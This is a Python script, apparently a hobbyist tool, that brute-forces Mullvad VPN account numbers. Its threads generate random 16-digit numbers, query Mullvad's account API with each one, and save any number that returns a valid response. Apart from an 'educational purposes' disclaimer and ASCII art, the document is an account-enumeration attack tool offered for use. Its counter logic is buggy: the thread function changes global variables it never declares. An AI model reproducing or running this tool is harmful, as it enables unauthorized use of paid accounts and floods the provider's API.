# ███▄    █  ▒█████   ███▄ ▄███▓ ▄▄▄      ▓█████▄
# ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒▒████▄    ▒██▀ ██▌
# ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░▒██  ▀█▄  ░██   █▌
# ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ ░██▄▄▄▄██ ░▓█▄   ▌
# ▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒ ▓█   ▓██▒░▒████▓
# ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒▒▓  ▒
# ░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░  ▒   ▒▒ ░ ░ ▒  ▒
# ░   ░ ░ ░ ░ ░ ▒  ░      ░     ░   ▒    ░ ░  ░
# ░     ░ ░         ░         ░  ░   ░
#                   ░
#
#
# BruteForcer for Mullvad VPN
# For Educational purposes
#
#
#
import random
import string
import threading
import requests
import time
import os

from os import system, name

from colorama import Fore, Style, init

init(autoreset=True)

os.system("mode con: cols=90 lines=35")


class format:
    BOLD = "\033[1m"
    END = "\033[0m"


invalid = 0
valid = 0
totalcount = 0


def n0mad():

    while True:
        acc = ("").join(random.choices(string.digits, k=16))
        r = requests.get(f"https://api.mullvad.net/www/accounts/{acc}")

        if r.status_code == 200:
            print(f"         Valid > {acc}")
            f.write(f"Valid > {acc}\n")
            valid += 1
            totalcount += 1
        else:
            print(Fore.RED + f"\n         Invalid " + Fore.WHITE + f"> {acc}")
            invalid += 1
            totalcount += 1


os.system("title Mulvad Gen + Checker")

# prints cool art


print(
    Style.NORMAL
    + Fore.RED
    + """
        
                        ███▄    █  ▒█████   ███▄ ▄███▓ ▄▄▄      ▓█████▄ 
                        ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒▒████▄    ▒██▀ ██▌
                        ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░▒██  ▀█▄  ░██   █▌
                        ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ ░██▄▄▄▄██ ░▓█▄   ▌
                        ▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒ ▓█   ▓██▒░▒████▓ 
                        ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒▒▓  ▒ 
                        ░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░  ▒   ▒▒ ░ ░ ▒  ▒ 
                        ░   ░ ░ ░ ░ ░ ▒  ░      ░     ░   ▒    ░ ░  ░ 
                        ░     ░ ░         ░         ░  ░   ░    
                                          ░      

                                            """
)
# prints menu items

print(
    Style.NORMAL
    + Fore.WHITE
    + """
        This script 99.9999999999999999% of the time is"""
    + Fore.RED
    + format.BOLD
    + """ NOT"""
    + format.END
)

print(
    Style.NORMAL
    + Fore.WHITE
    + """ 
        going to generate a usable mulvad account number.
                                        """
)


print(
    Style.NORMAL
    + Fore.WHITE
    + """
        
        
        It merely generates a random string of 16 numbers,
                                        """
)

print(
    Style.NORMAL
    + Fore.WHITE
    + """
        then checks to see if they are potentially a valid number.
                                    """
)

print(
    Style.BRIGHT
    + Fore.RED
    + """
        There are 10,000,000,000,000,000 theoretical possible combos, 
                                    """
)


print(
    Style.BRIGHT
    + Fore.RED
    + """
                                    DO NOT EXPECT HITS!
                                    """
)


# begins gen

gen = input(Fore.GREEN + "        Start Gen?" + Fore.WHITE + " [Y/N]: ")


f = open("acc numbers.txt", "w", encoding="utf-8")


yes = "Y", "y", "Yes", "yes", "YES"
no = "N", "n", "No", "no", "NO"

if gen in yes:

    if os.path.isfile("acc numbers.txt"):
        print(Fore.GREEN + "        TXT file found and successfully loaded!")

    else:
        print(Fore.RED + "TXT File not found :(")
        print(
            Fore.RED
            + "Please restart and create a file named 'acc numbers.txt' in the n0mad directory"
        )

    threads = int(
        input(
            Fore.GREEN
            + """        How Many threads would you like to use?"""
            + Fore.WHITE
            + """[Numeric value]"""
        )
    )

    # When running in a seperate window, adds a count to the top of it of invalid, valid, and total attempts
    import ctypes

    ctypes.windll.kernel32.SetConsoleTitleW(
        f" Mulvad Gen + Checker  - Valid: {valid}| Invalid: {invalid} | Total Generated:{totalcount}"
    )

    thread = []
    for i in range(threads):
        t = threading.Thread(target=n0mad)
        t.daemon = True
        t.start()
        thread.append(t)
    for threads in thread:
        threads.join()


if gen in no:
    print(Fore.RED + "        Closing")

    time.sleep(2)
    os._exit(1)
